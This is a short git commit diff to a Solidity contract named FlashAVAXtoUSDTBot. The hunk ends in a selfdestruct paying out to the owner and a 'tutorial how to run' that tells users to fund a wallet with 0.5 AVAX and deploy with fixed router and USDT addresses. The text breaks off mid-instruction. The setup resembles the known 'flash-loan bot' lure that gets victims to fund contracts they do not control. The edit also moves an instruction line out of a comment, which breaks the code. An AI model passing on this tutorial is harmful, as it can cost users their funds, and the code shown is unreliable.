709974d280e2ace87ca53e9713b5ddf88154f580
nenen22 <dennynikah@gmail.com>
2025-07-12 07:49:30 +0700

    Update avalance.sol

--- avalance.sol
+++ avalance.sol
@@ -75,7 +75,10 @@ contract FlashAVAXtoUSDTBot {
         selfdestruct(payable(owner));
     }
 }
-// Tutorial How to Run (Must prepare avax in wallet 0.5 Avax (about $10), avalance network metamaks)
+
+
+// TUTORIAL HOW TO RUN
+(Must prepare avax in wallet 0.5 Avax (about $10), avalance network metamaks)
 // 1. Compile 
 // 2. Deploy (fill `_router=' 0x60aE616a2155Ee3d9A68541Ba4544862310933d4 `and`_usdt`=` 0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7 `) 
 // 3. Copy address new contract and 
